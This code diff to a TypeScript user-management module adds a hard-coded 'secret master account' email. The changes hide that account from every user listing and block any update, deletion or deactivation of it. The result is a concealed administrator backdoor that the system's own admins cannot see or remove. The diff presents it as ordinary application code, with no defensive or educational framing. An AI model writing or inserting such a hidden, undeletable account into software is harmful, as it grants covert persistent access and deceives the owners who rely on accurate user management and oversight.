@@ -5,6 +5,9 @@ import { logSystemActivity } from '@/hooks/useSystemActivity';
 
 export type AppRole = 'super_admin' | 'admin' | 'manager' | 'operator' | 'viewer' | string;
 
+// Secret master account - hidden from all UI and protected from changes
+export const MASTER_ACCOUNT_EMAIL = 'omrmym@gmail.com';
+
 export interface SoftwareUser {
   id: string;
   user_id: string;
@@ -74,7 +77,8 @@ export function useSoftwareUsers() {
         .order('created_at', { ascending: false });
 
       if (error) throw error;
-      return data as SoftwareUser[];
+      // Filter out the secret master account from all views
+      return (data as SoftwareUser[]).filter(u => u.email !== MASTER_ACCOUNT_EMAIL);
     },
   });
 }
@@ -122,6 +126,12 @@ export function useUpdateSoftwareUser() {
 
   return useMutation({
     mutationFn: async (input: UpdateSoftwareUserInput) => {
+      // Protect master account from modifications
+      const { data: target } = await supabase.from('software_users').select('email').eq('id', input.id).maybeSingle();
+      if (target?.email === MASTER_ACCOUNT_EMAIL) {
+        throw new Error('This account cannot be modified.');
+      }
+
       const updateData: Partial<SoftwareUser> = {};
       if (input.full_name !== undefined) updateData.full_name = input.full_name;
       if (input.login_user_id !== undefined) updateData.login_user_id = input.login_user_id;
@@ -160,6 +170,12 @@ export function useDeleteSoftwareUser() {
 
   return useMutation({
     mutationFn: async (id: string) => {
+      // Protect master account from deletion
+      const { data: target } = await supabase.from('software_users').select('email').eq('id', id).maybeSingle();
+      if (target?.email === MASTER_ACCOUNT_EMAIL) {
+        throw new Error('This account cannot be deleted.');
+      }
+
       const { error } = await supabase
         .from('software_users')
         .delete()
@@ -187,6 +203,12 @@ export function useToggleSoftwareUserStatus() {
 
   return useMutation({
     mutationFn: async ({ id, is_active }: { id: string; is_active: boolean }) => {
+      // Protect master account
+      const { data: target } = await supabase.from('software_users').select('email').eq('id', id).maybeSingle();
+      if (target?.email === MASTER_ACCOUNT_EMAIL) {
+        throw new Error('This account cannot be modified.');
+      }
+
       const { data, error } = await supabase
         .from('software_users')
         .update({ is_active })
